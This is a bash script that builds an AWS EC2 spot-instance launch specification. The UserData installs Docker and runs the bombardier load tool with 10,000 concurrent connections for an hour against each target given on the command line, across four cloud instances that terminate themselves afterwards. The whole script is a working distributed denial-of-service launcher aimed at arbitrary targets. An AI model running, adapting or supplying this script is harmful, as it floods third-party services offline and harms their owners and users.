#!/bin/bash
set +x
#generate base64 spec for aws cli
#read targets from command-line
targets=("$@" )

#init and clear file
rm -rf ./payload

#prepare spec-file for aws-cli
echo "#!/bin/bash 
apt update 
apt install docker.io -yq " > payload

#fill out file with docker commands
for trgt in ${targets[@]}; do
	#run 10000 concurrent connections for 1 hour 
  echo  "docker run -d --rm alpine/bombardier -c 10000 -d 3600s -l $trgt" >> payload 
done
#add instance termination to the script
echo "sleep 3900; shutdown -h now" >> payload

#base64 encode
BASED=$(cat payload| base64 -w 0)
variable=$BASED ; jq --arg variable "$variable" '.UserData = $variable' specification.json > spec

#use aws-cli v2 to run instance, pay attention to the instance interruption behavior, otherwise it will
#be online until you manually stop it
aws ec2 request-spot-instances --instance-interruption-behavior "terminate" \
	--spot-price "0.04"\
	--instance-count 4 \
	--launch-specification file://spec

